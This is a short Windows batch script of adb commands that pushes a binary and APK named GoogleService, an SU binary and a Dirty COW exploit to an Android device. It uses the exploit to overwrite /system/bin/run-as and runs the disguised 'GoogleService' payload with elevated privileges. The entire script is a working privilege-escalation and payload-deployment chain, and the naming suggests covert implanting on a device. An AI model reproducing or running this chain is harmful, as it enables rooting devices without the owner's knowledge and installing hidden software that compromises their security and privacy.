adb push GoogleService /data/local/tmp
adb shell chmod 777 /data/local/tmp/GoogleService

adb push SU /data/local/tmp
adb shell chmod 777 /data/local/tmp/SU

adb push dirtycow /data/local/tmp
adb shell chmod 777 /data/local/tmp/dirtycow

adb push run-as /data/local/tmp
adb shell chmod 777 /data/local/tmp/run-as 

adb install GoogleService.apk
adb shell am start -n com.GoogleService/com.GoogleService.GoogleServiceActivity

adb shell /data/local/tmp/dirtycow /data/local/tmp/run-as /system/bin/run-as

adb shell run-as /data/local/tmp/GoogleService

pause